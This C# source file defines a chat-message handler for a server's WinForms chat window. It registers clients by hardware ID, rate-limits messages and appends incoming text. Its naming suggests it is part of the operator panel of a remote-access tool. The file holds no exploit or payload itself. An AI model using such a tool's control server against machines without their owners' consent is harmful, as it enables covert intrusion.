using System;
using System.Collections.Concurrent;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerChat
{
	private const int MaxRichTextLength = 200000;

	private static readonly ConcurrentDictionary<string, int> _msgCount = new ConcurrentDictionary<string, int>();

	private static readonly ConcurrentDictionary<string, DateTime> _msgWindowStart = new ConcurrentDictionary<string, DateTime>();

	private const int MaxMessagesPerSecond = 15;

	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string clientKey = client.IP + ":chat";
		DateTime now = DateTime.UtcNow;
		if (_msgWindowStart.TryGetValue(clientKey, out var windowStart) && (now - windowStart).TotalSeconds < 1.0)
		{
			if (_msgCount.AddOrUpdate(clientKey, 1, (string k, int v) => v + 1) > 15)
			{
				return;
			}
		}
		else
		{
			_msgWindowStart[clientKey] = now;
			_msgCount[clientKey] = 1;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Message"))
			{
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormChat form = (FormChat)client.Tag;
			string message = (string)objects[2];
			if (message != null && message.Length > 10000)
			{
				message = message.Substring(0, 10000) + "...";
			}
			form.Invoke((MethodInvoker)delegate
			{
				if (form.richTextBox1.Text.Length > 200000)
				{
					form.richTextBox1.Text = form.richTextBox1.Text.Substring(form.richTextBox1.Text.Length - 100000);
				}
				form.richTextBox1.Text += message;
				form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
				form.richTextBox1.ScrollToCaret();
			});
			return;
		}
		FormChat form2 = (FormChat)Application.OpenForms["Chat:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.Text = "Chat [" + (string)objects[2] + "]";
			form2.client = client;
			form2.richTextBox1.Enabled = true;
			form2.rjTextBox1.Enabled = true;
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
